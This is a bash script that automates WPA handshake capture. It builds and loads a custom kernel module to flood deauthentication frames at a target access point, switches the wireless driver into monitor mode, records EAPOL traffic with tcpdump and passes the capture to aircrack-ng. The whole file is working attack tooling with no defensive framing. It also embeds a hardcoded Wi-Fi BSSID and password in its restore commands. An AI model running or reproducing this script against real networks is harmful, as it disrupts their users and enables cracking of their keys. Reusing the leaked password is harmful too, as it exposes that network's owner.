#!/bin/bash
# grab_hs3.sh - Ultra-fast two-phase handshake capture
# Minimizes gap between deauth and monitor mode capture
# Usage: sudo bash /tmp/grab_hs3.sh <BSSID> <CHANNEL>

BSSID="$1"
CH="$2"

if [ -z "$BSSID" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL>"
    exit 1
fi

case "$CH" in
    1) FREQ=2412;; 2) FREQ=2417;; 3) FREQ=2422;; 4) FREQ=2427;;
    5) FREQ=2432;; 6) FREQ=2437;; 7) FREQ=2442;; 8) FREQ=2447;;
    9) FREQ=2452;; 10) FREQ=2457;; 11) FREQ=2462;; 12) FREQ=2467;; 13) FREQ=2472;;
    36) FREQ=5180;; 40) FREQ=5200;; 44) FREQ=5220;; 48) FREQ=5240;;
    *) FREQ=$((2407 + CH * 5));;
esac

DRIVER="/tmp/qca_cld3_wlan.ko"

echo "[*] Ultra-fast handshake capture: $BSSID ch$CH"

# Build petx5
cd /tmp
[ -f petx5.ko ] || { as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

rm -f /tmp/hs_fast*.pcap

for round in 1 2 3 4 5; do
    echo ""
    echo "=== Round $round/5 ==="

    # Phase 1: STA mode + rapid deauth
    killall wpa_supplicant 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1

    insmod "$DRIVER"
    sleep 3
    ip link set wlan0 up

    # Find SSID
    SSID=$(iw dev wlan0 scan 2>/dev/null | grep -A5 -i "$(echo $BSSID | tr 'A-F' 'a-f')" | grep "SSID:" | head -1 | sed 's/.*SSID: //')
    [ -z "$SSID" ] && SSID="unknown"
    echo "[*] SSID: $SSID"

    # Connect with wpa_supplicant
    cat > /tmp/wpa_t.conf << EOF
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
}
EOF
    wpa_supplicant -i wlan0 -c /tmp/wpa_t.conf -B 2>/dev/null
    sleep 4

    # Burst deauths - petx5 sends immediately in init_module
    DEAUTH_OK=0
    for i in 1 2 3 4 5 6 7 8 9 10; do
        rmmod kfind 2>/dev/null
        insmod /tmp/petx5.ko 2>/dev/null
        if dmesg | tail -2 | grep -q "calling lim_send"; then
            DEAUTH_OK=$((DEAUTH_OK + 1))
        fi
    done
    echo "[*] Deauths sent: $DEAUTH_OK"

    if [ $DEAUTH_OK -eq 0 ]; then
        echo "[!] No deauth sent, skipping capture"
        continue
    fi

    # Phase 2: FASTEST possible switch to monitor
    # Don't wait, just kill and reload immediately
    killall wpa_supplicant 2>/dev/null
    rmmod wlan
    # Minimal sleep - driver needs some time
    sleep 1
    insmod "$DRIVER" con_mode_monitor=4
    # Don't sleep 3 - try to start capture ASAP
    sleep 2
    ip link set wlan0 up 2>/dev/null
    iw dev wlan0 set freq $FREQ 2>/dev/null

    # Start capture immediately, run 30 seconds
    echo "[*] Capturing... (started $(date +%H:%M:%S))"
    START=$(date +%s)
    timeout 30 tcpdump -i wlan0 -w /tmp/hs_fast${round}.pcap 2>/dev/null
    END=$(date +%s)
    echo "[*] Captured for $((END-START))s"

    EAPOL=$(tcpdump -r /tmp/hs_fast${round}.pcap -n 2>/dev/null | grep -ci "eapol\|802.1X")
    echo "[*] EAPOL: $EAPOL"

    if [ "$EAPOL" -gt 0 ]; then
        echo "[!!!] EAPOL FOUND!"
        aircrack-ng /tmp/hs_fast${round}.pcap 2>&1 | head -15
        HS=$(aircrack-ng /tmp/hs_fast${round}.pcap 2>&1 | grep -c "1 handshake")
        if [ "$HS" -gt 0 ]; then
            echo "[!!!] HANDSHAKE CAPTURED! File: /tmp/hs_fast${round}.pcap"
            # Restore and exit
            rmmod wlan 2>/dev/null; sleep 1
            insmod "$DRIVER"; sleep 3
            systemctl start NetworkManager 2>/dev/null
            nmcli device wifi connect 8C:DE:F9:B3:9E:20 password 9006609b29404a ifname wlan0 2>/dev/null
            exit 0
        fi
    fi
done

echo ""
echo "[*] Merging captures..."
ls -la /tmp/hs_fast*.pcap 2>/dev/null
mergecap -w /tmp/hs_result.pcap /tmp/hs_fast*.pcap 2>/dev/null
aircrack-ng /tmp/hs_result.pcap 2>&1 | head -20

# Restore
echo "[*] Restoring..."
rmmod wlan 2>/dev/null; sleep 1
insmod "$DRIVER"; sleep 3
systemctl start NetworkManager 2>/dev/null
sleep 2
nmcli device wifi connect 8C:DE:F9:B3:9E:20 password 9006609b29404a ifname wlan0 2>/dev/null
echo "[*] Done."
